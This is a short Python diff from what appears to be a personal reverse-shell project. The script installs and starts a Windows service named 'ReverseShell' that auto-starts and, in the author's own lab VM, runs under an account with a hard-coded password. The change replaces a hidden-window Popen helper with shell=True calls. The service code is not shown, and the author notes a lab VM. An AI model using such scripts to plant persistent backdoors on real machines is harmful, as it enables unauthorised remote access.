@@ -2,38 +2,21 @@ import subprocess
 import os
 
 
-def popen(cmd: str) -> str:
-    """For pyinstaller -w"""
-    startupinfo = subprocess.STARTUPINFO()
-    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-    process = subprocess.Popen(cmd, startupinfo=startupinfo, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                               stdin=subprocess.PIPE)
-    return process.stdout.read()
-
-
 def main():
-    try:
-        # Change directory to 'Desktop'.
-        os.chdir(os.path.join(os.environ["HOMEPATH"], "Desktop"))
-        os.chdir("Reverse-Shell")
-        cmd = "python service.py install"
-        p = popen(cmd)
-        print(p)
-        cmd = "python service.py update"
-        p = popen(cmd)
-        print(p)
-        cmd = "sc config ReverseShell start=auto"
-        p = popen(cmd)
-        print(p)
-        # This command is only needed in my windows server 2016 VM.
-        cmd = r"sc config ReverseShell obj= WINDEV1911EVAL\User password= admin type= own"
-        p = popen(cmd)
-        print(p)
-        cmd = "net start ReverseShell"
-        p = popen(cmd)
-        print(p)
-    except Exception as e:
-        print(e)
+    # Change directory to 'Desktop'.
+    os.chdir(os.path.join(os.environ["HOMEPATH"], "Desktop"))
+    os.chdir("Reverse-Shell")
+    cmd = "python service.py install"
+    subprocess.call(cmd, shell=True)
+    cmd = "python service.py update"
+    subprocess.call(cmd, shell=True)
+    cmd = "sc config ReverseShell start=auto"
+    subprocess.call(cmd, shell=True)
+    # This command is only needed in my windows server 2016 VM.
+    cmd = r"sc config ReverseShell obj= WINDEV1911EVAL\User password= admin type= own"
+    subprocess.call(cmd, shell=True)
+    cmd = "net start ReverseShell"
+    subprocess.call(cmd, shell=True)
 
 
 if __name__ == '__main__':
